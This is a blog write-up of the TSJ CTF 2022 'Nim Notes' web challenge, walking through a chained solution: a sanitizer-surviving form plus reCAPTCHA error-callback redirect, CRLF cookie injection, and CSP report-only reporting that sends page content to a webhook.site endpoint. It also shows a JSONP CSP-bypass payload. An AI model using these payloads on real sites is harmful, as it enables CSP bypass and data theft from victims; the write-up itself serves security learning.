---
title: TSJ CTF 2022 - web/Nim Notes Notes
catalog: true
date: 2022-03-02 22:02:11
tags: [Security]
categories: [Security]
photos: /img/tsj-ctf-2022-nim-notes/cover-en.png
---

Last weekend, in addition to the SUSCTF 2022 I wrote about in my previous post, there was also another TSJ CTF with many good challenges. Due to time constraints, I only chose the ones that interested me more, and this is the Nim Notes challenge mentioned in the title. I didn't manage to solve it in the end (I was far from it), but the solution was very interesting, so I'm writing this post to record the official solution.

The author's (maple3142) writeup is here: https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes

<!-- more -->

## Challenge Introduction and Solution

Challenge description:

> I made this note taking web app in Nim as a part of learning it. If you have some cool notes about Nim please share it with me!

In short, it's another common note-taking web app in CTF. After logging in, you can add notes and report your note page to the admin bot. When rendering the note page, it doesn't directly spit out data from the backend, but instead uses the API to fetch data from the frontend and render it on the screen.

The HTML of the note page looks like this:

``` html
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<link rel="stylesheet" href="/css/bootstrap.min.css" />
		<title>Notes</title>
	</head>
	<body class="d-flex flex-column min-vh-100">
		<!-- navbar -->
		<nav class="navbar navbar-expand-lg navbar-dark bg-dark mb-3">
			<div class="container-fluid">
				<span class="navbar-brand mb-0 h1">Notes</span>
				<ul class="navbar-nav">
					<li class="nav-item">
						<a class="nav-link" id="share-btn" href="javascript:void">Share To Admin</a>
					</li>
					<li class="nav-item">
						<a class="nav-link" id="logout-btn" href="javascript:void">Logout</a>
					</li>
				</ul>
			</div>
		</nav>

		<!-- editing area -->
		<div class="container">
			<div class="row justify-content-md-center">
				<div class="col-8">
					<div class="mb-3">
						<input id="title" class="form-control" placeholder="Title" />
						<textarea
							id="content"
							class="form-control"
							placeholder="e.g. I learned how to use `template` in Nim today :)"
						></textarea>
						<div class="d-grid gap-2">
							<button class="btn btn-primary" id="add-btn">Add</button>
						</div>
					</div>
				</div>
			</div>
		</div>

		<!-- note template -->
		<template id="note-tmpl">
			<div class="col-4">
				<div class="card">
					<div class="card-body">
						<h5 class="note-title card-title">title</h5>
						<h6 class="note-author card-subtitle mb-2 text-muted">author</h6>
						<p class="note-content card-text">text</p>
					</div>
				</div>
			</div>
		</template>

		<!-- note container -->
		<div class="container">
			<div class="row" id="notes-container"></div>
		</div>

		<!-- footer -->
		<div class="d-flex justify-content-md-center mt-auto">
			<p>&copy; 2022-2087 All rights reserved.</p>
		</div>

		<!-- hidden logout form-->
		<form hidden="true" id="logout-form" action="/logout" method="post"></form>

		<!-- scripts and recaptcha -->
		<div class="g-recaptcha" data-sitekey="$#" data-callback="tokenCallback" data-size="invisible"></div>
		<script src="/js/purify.min.js"></script>
		<script src="/js/marked.min.js"></script>
		<script src="/js/app.js"></script>
		<script async src="https://www.google.com/recaptcha/api.js"></script>
	</body>
</html>
```

The main logic is in app.js:

``` js
// rendering notes
const container = document.getElementById('notes-container')
function createNote(note) {
	const el = document.importNode(document.getElementById('note-tmpl').content, true)
	el.querySelector('.note-title').textContent = note.title
	el.querySelector('.note-author').textContent = note.author
	el.querySelector('.note-content').innerHTML = DOMPurify.sanitize(marked.parse(note.content))
	return el
}
function loadNotes() {
	container.textContent = ''
	fetch('/api/notes' + location.search)
		.then(r => r.json())
		.then(notes => {
			container.append(...notes.map(createNote))
		})
}

// submitting notes
const titleEl = document.getElementById('title')
const contentEl = document.getElementById('content')
function trySubmit() {
	const title = titleEl.value
	const content = contentEl.value
	if (title && content) {
		fetch('/api/notes', {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({ title, content })
		})
			.then(r => r.json())
			.then(r => {
				if (r.status === 'ok') {
					titleEl.value = ''
					contentEl.value = ''
					loadNotes()
				} else {
					alert(r.msg)
				}
			})
	}
}
const addBtn = document.getElementById('add-btn')
addBtn.addEventListener('click', trySubmit)

// logout btn
function logout() {
	document.getElementById('logout-form').submit()
}
const logoutBtn = document.getElementById('logout-btn')
logoutBtn.addEventListener('click', logout)

// share to admin btn
function tokenCallback(token) {
	fetch('/api/share', {
		method: 'POST',
		headers: { 'Content-Type': 'application/json' },
		body: JSON.stringify({ token })
	})
		.then(r => r.json())
		.then(r => {
			if (r.status === 'ok') {
				alert('Admin will view your note later!')
			} else {
				alert('Sorry, you need to pass recaptcha')
			}
		})
}
function share() {
	grecaptcha.execute()
}
const shareBtn = document.getElementById('share-btn')
shareBtn.addEventListener('click', share)

// init
loadNotes()
```

The only injection point is here: `el.querySelector('.note-content').innerHTML = DOMPurify.sanitize(marked.parse(note.content))`. However, because it has been passed through `DOMPurify.sanitize`, direct XSS is not possible. The CSP of this challenge is also quite strict:

```
default-src 'self'; script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; frame-src https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;
```

Basically, script can only be imported by itself or reCAPATCHA, and there is no `unsafe-inline` available. Other things like style are also blocked, so it's not CSS injection. I tried to find out if DOM clobbering could be used, but I couldn't find any exploitable places.

When I first saw this CSP, I thought that `%2f` could be used to bypass `https://www.google.com/recaptcha/`. For example, there is a google.com JSONP payload on [JSONBee](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt):

``` html
<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
```

If you change the URL to `https://www.google.com/recaptcha/..%2fcomplete/search?client=...`, the browser will pass the CSP, and some servers will interpret `..%2f` as `../`, so it will be the endpoint we mentioned above. However, after trying it out, I found that this trick doesn't work on Google and only returns a 404 not found, so it cannot be exploited.

Anyway, I was stuck for an hour or two, and I couldn't even figure out how to start.

Later, the official solution gave two hints. The first hint was that in the first step, admin bot should be able to access your website, so there should be a redirect vulnerability on the note page. The second hint clearly indicated that the key to the first step was reCAPATCHA, and the answer could be found by carefully reading the documentation.

From the [documentation](https://developers.google.com/recaptcha/docs/display#render_param), it is not difficult to find an attribute that can be used: `data-error-callback`, which is described as:

> Optional. The name of your callback function, executed when reCAPTCHA encounters an error (usually network connectivity) and cannot continue until connectivity is restored. If you specify a function here, you are responsible for informing the user that they should retry.

When reCAPTCHA fails to load, the function written in this attribute is called. The next step is to see which functions can be used in the code, and we found this:

``` js
function logout() {
	document.getElementById('logout-form').submit()
}
```

The original position of the logout-form is below the position where the note is inserted, so we can use another form to cover it up.

Because DOMPurify does not filter forms by default, nor does it filter attributes starting with `data-`, the following HTML can be used to redirect the webpage:

``` html
<form action="https://example.com" id="logout-form"></form>
<div class="g-recaptcha" data-sitekey="A" data-error-callback="logout" data-size="invisible"></div>
```

The first stage is completed in this way, and the admin bot can be directed to any page. When I first saw the prompt, I got stuck here for a long time and couldn't figure out what to do next.

Looking at the solution, the second stage is the CRLF injection of `setCookie`, but because the injection point is below the CSP header, it is not possible to disable CSP, so even if you can control the response, theoretically it is not possible to XSS. This brings us to the exciting third stage.

Before talking about the third stage, let me mention an unexpected solution that breaks the premise of "theoretically impossible to XSS". The reason is that nim's sqlite library will explode when the content contains `\0`, and after the explosion, it will directly spit out an error message without a CSP header, resulting in a happy XSS.

Back to the exciting third stage.

The third stage is to use the [Content-Security-Policy-Report-Only](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only) header to leak the flag. This is mainly because when the rules are violated, a JSON is sent to the server, which contains a `script-sample`. If an inline script violates the rules, the first 40 characters will be included (there is also a prerequisite that CSP must include `report-sample`).

We can set up a simple server to verify:

``` js
const express = require('express')
const app = express()

app.get('/abc', (req, res) => {
  res.header('Content-Security-Policy', "default-src 'self'; script-src 'self';")
  res.header('Content-Security-Policy-Report-Only', "script-src 'report-sample'; report-uri https://webhook.site/419d518f-922b-4e1e-8583-65596fae1c95")
  
  res.send(`
    <body>
      <h1>hello</h1>
      <script>flag{test_flag}</script>
    </body>
  `)
  res.end()
})

app.listen(3000, () => {
  console.log('listening on http://localhost:3000')
})
```

From the browser, you can see what the sent request looks like:

```
{
  "csp-report": {
    "document-uri": "http://localhost:3000/abc",
    "referrer": "",
    "violated-directive": "script-src-elem",
    "effective-directive": "script-src-elem",
    "original-policy": "script-src 'report-sample'; report-uri https://webhook.site/419d518f-922b-4e1e-8583-65596fae1c95",
    "disposition": "report",
    "blocked-uri": "inline",
    "line-number": 4,
    "source-file": "http://localhost:3000/abc",
    "status-code": 200,
    "script-sample": "flag{test_flag}"
  }
}
```

With this, the flag can be easily obtained and the work is done.

## Other Possibilities

When writing this article, I thought about other possibilities at each stage, but under the strict conditions of the original question, the possible paths are very limited. However, if some changes are made to the original question and some restrictions are relaxed, there may be other possibilities.

### Open redirect

This is the only other solution I can think of under the condition that the original question remains unchanged. If you find an open redirect or JSONP for `https://www.google.com/recaptcha/` or `https://www.gstatic.com/recaptcha/`, you can bypass CSP to execute JavaScript.

### CSS injection

If CSP is relaxed, the script part is still blocked, but other style-related parts such as style-src, font-src, and img-src are not blocked, then there may be a chance to use [CSS injection](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/) to slowly leak the flag.
